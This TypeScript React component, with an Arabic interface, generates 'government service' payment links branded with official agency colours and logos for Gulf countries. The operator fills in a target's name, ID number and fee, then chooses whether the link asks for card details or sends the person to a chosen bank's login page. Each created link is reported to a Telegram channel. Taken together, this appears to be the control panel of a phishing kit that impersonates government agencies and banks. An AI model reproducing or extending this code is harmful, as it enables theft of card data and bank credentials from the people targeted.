import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getGovernmentServicesByCountry } from "@/lib/gccGovernmentServices";
import { getBanksByCountry } from "@/lib/banks";
import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { getServiceBranding } from "@/lib/serviceLogos";
import { Building2, DollarSign, Hash, Copy, ExternalLink, CreditCard, User, FileText } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import {
  AlertDialog,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreateGovernmentLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "");
  const services = getGovernmentServicesByCountry(country?.toUpperCase() || "");
  
  const [selectedService, setSelectedService] = useState("");
  const [referenceNumber, setReferenceNumber] = useState("");
  const [applicantName, setApplicantName] = useState("");
  const [applicantId, setApplicantId] = useState("");
  const [serviceDescription, setServiceDescription] = useState("");
  const [feeAmount, setFeeAmount] = useState("100");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [selectedBank, setSelectedBank] = useState("");
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [copied, setCopied] = useState(false);
  
  const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
  
  const selectedServiceData = useMemo(() => 
    services.find(s => s.key === selectedService),
    [services, selectedService]
  );

  const serviceBranding = useMemo(() => 
    selectedService ? getServiceBranding(selectedService) : getServiceBranding('mol'),
    [selectedService]
  );

  const governmentTheme = {
    primary: serviceBranding.colors.primary,
    secondary: serviceBranding.colors.secondary,
    gradient: serviceBranding.gradients?.primary || `linear-gradient(135deg, ${serviceBranding.colors.primary}, ${serviceBranding.colors.secondary})`,
    bgLight: "#f0f9ff"
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!selectedService || !referenceNumber || !applicantName) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول المطلوبة",
        variant: "destructive",
      });
      return;
    }
    
    try {
      const link = await createLink.mutateAsync({
        type: "government",
        country_code: country || "",
        payload: {
          service_key: selectedService,
          service_name: selectedServiceData?.nameAr || selectedService,
          reference_number: referenceNumber,
          applicant_name: applicantName,
          applicant_id: applicantId,
          service_description: serviceDescription,
          fee_amount: parseFloat(feeAmount) || 100,
          payment_method: paymentMethod,
          selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
          selectedCountry: country || "SA",
          category: selectedServiceData?.category || "general",
        },
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: selectedService,
        country: country || 'SA'
      });

      await sendToTelegram({
        type: 'government_link_created',
        data: {
          reference_number: referenceNumber,
          service_name: selectedServiceData?.nameAr || selectedService,
          applicant_name: applicantName,
          service_description: serviceDescription,
          fee_amount: parseFloat(feeAmount) || 0,
          country: countryData.nameAr,
          payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?service=${selectedService}`
        },
        timestamp: new Date().toISOString(),
      });

      setCreatedPaymentUrl(paymentUrl);
      setShowSuccessDialog(true);
      
      toast({
        title: "تم إنشاء رابط الدفع بنجاح",
        description: "يمكنك الآن مشاركة الرابط مع المستفيد",
      });
    } catch (error) {
      console.error("Error creating link:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء إنشاء الرابط",
        variant: "destructive",
      });
    }
  };
  
  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdPaymentUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({
      title: "تم النسخ!",
      description: "تم نسخ الرابط إلى الحافظة",
    });
  };
  
  const handlePreview = () => {
    window.open(createdPaymentUrl, '_blank');
  };

  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center" dir="rtl" style={{ background: governmentTheme.bgLight }}>
        <div className="text-center p-8">
          <Building2 className="w-16 h-16 mx-auto mb-4" style={{ color: governmentTheme.primary }} />
          <h2 className="text-2xl font-bold mb-2">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')} style={{ background: governmentTheme.gradient }}>
            العودة للخدمات
          </Button>
        </div>
      </div>
    );
  }
  
  return (
    <div className="min-h-screen py-4" dir="rtl" style={{ background: `linear-gradient(to bottom, ${governmentTheme.bgLight}, white)` }}>
      <div className="container mx-auto px-4">
        <div className="max-w-2xl mx-auto">
          <Card className="p-4 shadow-xl border-2" style={{ borderColor: `${governmentTheme.primary}20` }}>
            <div
              className="h-20 -m-4 mb-4 rounded-t-xl relative overflow-hidden"
              style={{ background: governmentTheme.gradient }}
            >
              <div className="absolute inset-0 bg-black/10" />
              <div className="absolute inset-0 flex items-center justify-between px-6">
                <div className="text-white">
                  <div className="flex items-center gap-2 mb-1">
                    <Building2 className="w-6 h-6" />
                    <h1 className="text-xl font-bold">الخدمات الحكومية</h1>
                  </div>
                  <p className="text-sm opacity-90">إنشاء رابط دفع للخدمات الحكومية - {countryData.nameAr}</p>
                </div>
                <div className="text-4xl">🏛️</div>
              </div>
            </div>
            
            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Service Selection */}
              <div>
                <Label className="mb-2 text-sm font-semibold" style={{ color: governmentTheme.primary }}>
                  الخدمة الحكومية *
                </Label>
                <Select value={selectedService} onValueChange={setSelectedService}>
                  <SelectTrigger className="h-11 border-2" style={{ borderColor: `${governmentTheme.primary}30` }}>
                    <SelectValue placeholder="اختر الخدمة الحكومية" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    {services.map((service) => (
                      <SelectItem key={service.id} value={service.key}>
                        <div className="flex items-center gap-2">
                          <Building2 className="w-4 h-4" style={{ color: governmentTheme.primary }} />
                          <span>{service.nameAr}</span>
                        </div>
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              
              {/* Service Description */}
              {selectedService && selectedServiceData && (
                <div className="p-3 rounded-lg border-2" style={{ 
                  borderColor: `${governmentTheme.primary}30`,
                  background: governmentTheme.bgLight
                }}>
                  <div className="flex items-center gap-2 mb-2">
                    <Building2 className="w-4 h-4" style={{ color: governmentTheme.primary }} />
                    <h3 className="font-semibold text-sm">{selectedServiceData.nameAr}</h3>
                  </div>
                  {selectedServiceData.description && (
                    <p className="text-xs text-muted-foreground">{selectedServiceData.description}</p>
                  )}
                </div>
              )}
              
              {/* Reference Number */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Hash className="w-3 h-3" style={{ color: governmentTheme.primary }} />
                  رقم الطلب أو المعاملة *
                </Label>
                <Input
                  value={referenceNumber}
                  onChange={(e) => setReferenceNumber(e.target.value)}
                  placeholder="مثال: REF-2024-001"
                  className="h-10 text-sm border-2"
                  style={{ borderColor: `${governmentTheme.primary}20` }}
                  required
                />
              </div>

              {/* Applicant Name */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <User className="w-3 h-3" style={{ color: governmentTheme.primary }} />
                  اسم مقدم الطلب *
                </Label>
                <Input
                  value={applicantName}
                  onChange={(e) => setApplicantName(e.target.value)}
                  placeholder="الاسم الكامل"
                  className="h-10 text-sm border-2"
                  style={{ borderColor: `${governmentTheme.primary}20` }}
                  required
                />
              </div>

              {/* Applicant ID */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <FileText className="w-3 h-3" style={{ color: governmentTheme.primary }} />
                  رقم الهوية / الإقامة
                </Label>
                <Input
                  value={applicantId}
                  onChange={(e) => setApplicantId(e.target.value)}
                  placeholder="رقم الهوية أو الإقامة"
                  className="h-10 text-sm border-2"
                  style={{ borderColor: `${governmentTheme.primary}20` }}
                />
              </div>
              
              {/* Service Description */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <FileText className="w-3 h-3" style={{ color: governmentTheme.primary }} />
                  وصف الخدمة أو التفاصيل
                </Label>
                <Textarea
                  value={serviceDescription}
                  onChange={(e) => setServiceDescription(e.target.value)}
                  placeholder="أدخل تفاصيل إضافية عن الخدمة"
                  className="text-sm min-h-[80px] border-2"
                  style={{ borderColor: `${governmentTheme.primary}20` }}
                />
              </div>
              
              {/* Fee Amount */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <DollarSign className="w-3 h-3" style={{ color: governmentTheme.primary }} />
                  رسوم الخدمة
                  {country && (
                    <span className="text-xs text-muted-foreground">
                      ({getCurrencyName(country)})
                    </span>
                  )}
                </Label>
                <Input
                  type="number"
                  value={feeAmount}
                  onChange={(e) => setFeeAmount(e.target.value)}
                  placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
                  className="h-10 text-sm font-semibold border-2"
                  style={{ borderColor: `${governmentTheme.primary}20` }}
                  step="0.01"
                  min="0"
                />
                {country && (
                  <p className="text-xs text-muted-foreground mt-1">
                    💱 العملة: {getCurrencyName(country)} ({getCurrencySymbol(country)})
                  </p>
                )}
              </div>
              
              {/* Payment Method Selection */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <CreditCard className="w-3 h-3" style={{ color: governmentTheme.primary }} />
                  طريقة الدفع *
                </Label>
                <Select value={paymentMethod} onValueChange={setPaymentMethod}>
                  <SelectTrigger className="h-10 border-2" style={{ borderColor: `${governmentTheme.primary}30` }}>
                    <SelectValue placeholder="اختر طريقة الدفع" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    <SelectItem value="card">
                      <div className="flex items-center gap-2">
                        <CreditCard className="w-4 h-4" />
                        <span>بيانات البطاقة</span>
                      </div>
                    </SelectItem>
                    <SelectItem value="bank_login">
                      <div className="flex items-center gap-2">
                        <Building2 className="w-4 h-4" />
                        <span>تسجيل دخول البنك</span>
                      </div>
                    </SelectItem>
                  </SelectContent>
                </Select>
                <p className="text-xs text-muted-foreground mt-1">
                  {paymentMethod === "card" 
                    ? "🔒 سيُطلب من المستفيد إدخال بيانات البطاقة"
                    : "🏦 سيُطلب من المستفيد تسجيل الدخول للبنك"}
                </p>
              </div>
              
              {/* Bank Selection (Only for bank_login) */}
              {paymentMethod === "bank_login" && (
                <div>
                  <Label className="mb-2 flex items-center gap-2 text-sm">
                    <Building2 className="w-3 h-3" style={{ color: governmentTheme.primary }} />
                    اختر البنك *
                  </Label>
                  <Select value={selectedBank} onValueChange={setSelectedBank}>
                    <SelectTrigger className="h-10 border-2" style={{ borderColor: `${governmentTheme.primary}30` }}>
                      <SelectValue placeholder="اختر البنك" />
                    </SelectTrigger>
                    <SelectContent className="bg-background z-50">
                      {banks.map((bank) => (
                        <SelectItem key={bank.id} value={bank.id}>
                          <div className="flex items-center gap-2">
                            {bank.logo && (
                              <img 
                                src={bank.logo} 
                                alt={bank.nameAr}
                                className="h-5 w-5 object-contain"
                                onError={(e) => e.currentTarget.style.display = 'none'}
                              />
                            )}
                            <span>{bank.nameAr}</span>
                          </div>
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  <p className="text-xs text-muted-foreground mt-1">
                    💡 سيتم توجيه المستفيد لصفحة تسجيل دخول {banks.find(b => b.id === selectedBank)?.nameAr || 'البنك'}
                  </p>
                </div>
              )}
              
              {/* Submit Button */}
              <Button
                type="submit"
                className="w-full py-5 text-white"
                style={{ background: governmentTheme.gradient }}
                disabled={createLink.isPending}
              >
                {createLink.isPending ? (
                  <span className="text-sm">جاري الإنشاء...</span>
                ) : (
                  <>
                    <Building2 className="w-4 h-4 ml-2" />
                    <span className="text-sm">إنشاء رابط الدفع</span>
                  </>
                )}
              </Button>
            </form>
          </Card>
        </div>
      </div>
      
      {/* Success Dialog */}
      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <AlertDialogContent className="max-w-md" dir="rtl">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-xl text-center">
              ✅ تم إنشاء رابط الدفع بنجاح!
            </AlertDialogTitle>
            <AlertDialogDescription className="text-center">
              يمكنك نسخ الرابط أو معاينته قبل المتابعة
            </AlertDialogDescription>
          </AlertDialogHeader>
          
          <div className="my-4">
            {/* Payment Summary */}
            <div className="bg-secondary/50 p-4 rounded-lg mb-4 space-y-2">
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">الخدمة:</span>
                <span className="font-semibold">{selectedServiceData?.nameAr || selectedService}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">رقم المعاملة:</span>
                <span className="font-semibold">{referenceNumber}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">المستفيد:</span>
                <span className="font-semibold">{applicantName}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">الرسوم:</span>
                <span className="font-semibold">
                  {formatCurrency(parseFloat(feeAmount) || 100, country || "SA")}
                </span>
              </div>
            </div>

            <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
              {createdPaymentUrl}
            </div>

            <div className="flex gap-2">
              <Button
                onClick={handleCopyLink}
                variant="outline"
                className="flex-1"
              >
                {copied ? (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    تم النسخ!
                  </>
                ) : (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    نسخ الرابط
                  </>
                )}
              </Button>

              <Button
                onClick={handlePreview}
                variant="outline"
                className="flex-1"
              >
                <ExternalLink className="w-4 h-4 ml-2" />
                معاينة
              </Button>
            </div>
          </div>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
};

export default CreateGovernmentLink;
